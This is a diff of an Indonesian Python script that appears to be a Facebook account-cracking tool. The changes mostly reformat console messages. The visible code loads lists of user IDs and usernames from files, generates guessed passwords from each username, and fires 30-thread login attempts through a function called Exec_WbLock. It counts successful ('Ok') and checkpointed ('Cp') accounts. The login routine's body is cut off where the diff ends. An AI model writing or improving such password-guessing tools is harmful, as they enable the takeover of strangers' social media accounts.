@@ -1,6 +1,5 @@
-#coding utf-8
-#author: Zoraa Dev
-#ZFB ID
+# coding utf-8
+# author: Zoraa Dev
 
 import os, re, sys, json, requests, time, uuid, random
 from rich.console import Console
@@ -42,8 +41,8 @@ class Zoraa_Dev:
     def Via_File(self):
         try:
             Logo().ZFB_ID()
-            Console().print('• banyaknya file, gunakan pemisah koma (,) tanpa spasi')
-            query = Console().input('? Input file: ')
+            Console().print('[•] Setiap File Gunakan Pemisah Koma, No Spasi!')
+            query = Console().input('[?] Input file: '); print()
             if len(query) > 0:
                 for par in query.split(','):
                     for buk in open(str(par)):
@@ -51,26 +50,26 @@ class Zoraa_Dev:
                             self.userid, self.username = buk.split('|')[0], buk.split('|')[1]
                             if self.userid+'|'+self.username not in dump:
                                 dump.append(self.userid+'|'+self.username)
-                                Console().print(f'• dump: {str(self.userid)[:20]}/ {len(dump)}', end='\r')
+                                Console().print(f'[•] Dump: {str(self.userid)[:20]}/ {len(dump)}', end='\r')
                         except (KeyboardInterrupt, Exception) as e:
-                            Console().print(f'• Error: {str(e).title()}')
+                            Console().print(f'[!] Error: {str(e).title()}')
                     self.ThreadPoolExecutor()
             else:
-                exit('• anda tidak memasukan apapun')
+                exit('[!] anda tidak memasukan apapun')
         except (KeyboardInterrupt, Exception) as e:
-            exit(f'• Error: {str(e).title()}')
+            exit(f'[!] Error: {str(e).title()}')
 
     def ThreadPoolExecutor(self):
         try:
-            Console().print('\n\n• Save Ok: {}\n• Save Cp: {}\n'.format(self.ok,self.cp))
+            Console().print('\n\n[•] Save Ok: {}\n[•] Save Cp: {}\n'.format(self.ok,self.cp))
             with ThreadPoolExecutor(max_workers=30) as V:
                 for UserID_And_Username in dump:
                     self.userid, self.username = UserID_And_Username.split('|')
                     self.password = self.WordList(self.username)
                     V.submit(self.Exec_WbLock, self.userid, self.password)
-            Console().print('\n• Hasil Ok: {}\n• Hasil Cp: {}\n[•] Dump: {}'.format(self.success,self.checkpoint,str(len(dump))))
+            Console().print('\n\n[•] Hasil Ok: {}\n[•] Hasil Cp: {}\n\n[•] Dump ID: {}'.format(self.success,self.checkpoint,str(len(dump))))
         except (KeyboardInterrupt, Exception) as e:
-            exit(f'• Error: {str(e).title()}')
+            exit(f'[!] Error: {str(e).title()}')
             
     def Exec_WbLock(self, userid, password):
         with requests.Session() as byps:
